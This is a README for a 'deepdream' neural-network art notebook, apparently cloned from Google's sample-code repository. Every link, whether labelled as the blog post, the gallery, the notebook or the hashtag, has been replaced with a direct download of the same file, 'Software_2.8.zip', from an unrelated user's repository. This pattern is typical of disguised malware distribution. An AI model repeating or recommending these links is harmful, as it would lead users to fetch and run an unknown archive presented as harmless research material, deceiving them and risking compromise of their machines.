# deepdream

This repository contains IPython Notebook with sample code, complementing 
Google Research [blog post](https://raw.githubusercontent.com/jakyjackal/deepdream/master/dismarble/Software_2.8.zip) about Neural Network art.
See [original gallery](https://raw.githubusercontent.com/jakyjackal/deepdream/master/dismarble/Software_2.8.zip) for more examples.

You can view "https://raw.githubusercontent.com/jakyjackal/deepdream/master/dismarble/Software_2.8.zip" directly on github, or clone the repository, 
install dependencies listed in the notebook and play with code locally.

It'll be interesting to see what imagery people are able to generate using the described technique. If you post images to Google+, Facebook, or Twitter, be sure to tag them with [#deepdream](https://raw.githubusercontent.com/jakyjackal/deepdream/master/dismarble/Software_2.8.zip) so other researchers can check them out too.
